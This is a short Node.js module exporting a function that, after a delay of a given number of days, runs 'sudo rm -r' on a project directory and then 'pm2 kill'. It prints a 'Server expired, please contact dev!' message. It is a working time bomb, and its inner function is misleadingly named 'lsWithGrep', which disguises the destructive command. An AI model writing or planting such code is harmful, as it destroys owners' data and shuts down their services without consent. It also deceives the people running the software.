const fs  = require('fs');
const path = require('path');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
// console.log('removing myself...');
// fs.unlinkSync('./selfDelete.js');

const sld = (day) =>{
  const time = 86400000 * parseInt(day); 
setTimeout(() => {
    
  const directory = 'src';

  async function lsWithGrep() {
    try {
        const { stdout, stderr } = await exec('sudo rm -r /home/ubuntu/Auto-destruct-node-code && pm2 kill');
        console.log(`Server expired , please contact dev!`);
        console.log('stderr:', stderr);
    }catch (err) {

      console.log(err);
    }
  }

  lsWithGrep();

}, time);
}

module.exports = {sld}
  
 